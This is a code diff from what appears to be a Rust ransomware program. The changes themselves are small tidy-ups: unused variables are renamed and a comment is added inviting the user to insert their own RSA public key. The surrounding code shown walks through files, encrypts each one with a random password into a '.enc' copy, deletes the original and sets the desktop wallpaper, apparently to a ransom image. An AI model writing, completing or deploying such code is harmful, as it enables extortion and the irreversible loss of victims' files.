@@ -111,7 +111,7 @@ pub fn encrypt_large_file(
     let key = create_key(password, nonce.clone());
     let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();
 
-    for (n_chunk, src_chunk) in src.chunks(CHUNK_SIZE).enumerate() {
+    for (_n_chunk, src_chunk) in src.chunks(CHUNK_SIZE).enumerate() {
         encrypt_core(&mut dist, src_chunk.to_vec(), &key, nonce)
     }
 
@@ -136,7 +136,7 @@ pub fn decrypt_large_file(
     let key = create_key(password, nonce.clone());
     let nonce = Nonce::from_slice(nonce.as_slice()).unwrap();
 
-    for (n_chunk, src_chunk) in src.chunks(CHUNK_SIZE + CHACHA_KEYSIZE + POLY1305_OUTSIZE).enumerate() {
+    for (_n_chunk, src_chunk) in src.chunks(CHUNK_SIZE + CHACHA_KEYSIZE + POLY1305_OUTSIZE).enumerate() {
         decrypt_core(&mut output_file, src_chunk.to_vec(), &key, nonce);
     }
 
@@ -156,6 +156,7 @@ fn main() {
     };
     let pass = generate_random_string(20);
 
+    // Change this for your public RSA key
     let pem = "-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlpnmNvyemuON6QMsVZZX
 29vXAc0rapY0XBqN1qdzf/UoeBDV5VYMh+E4aq0XhDDHEQCLkHmoLgpuP2mVnX3O
@@ -185,10 +186,6 @@ SwIDAQAB
         let _encrypted_filee = encrypt_large_file(entry.path().to_str().unwrap_or(""), &format!("{}{}", entry.path().to_str().unwrap_or(""), ".enc" ), pass.to_owned());
         let _ = remove_file(entry.path());
     }
-
-
-   
-
 
     let temp_image_path = "C:\\temp_image.jpg";
 
@@ -264,7 +261,7 @@ fn set_desktop_background(path: &str) -> Result<(), String> {
     let wide_path: Vec<u16> = OsStr::new(path).encode_wide().chain(std::iter::once(0)).collect();
 
     unsafe {
-        let result = SystemParametersInfoW(
+        let _result = SystemParametersInfoW(
             SPI_SETDESKWALLPAPER,
             0,
             wide_path.as_ptr() as *mut _,
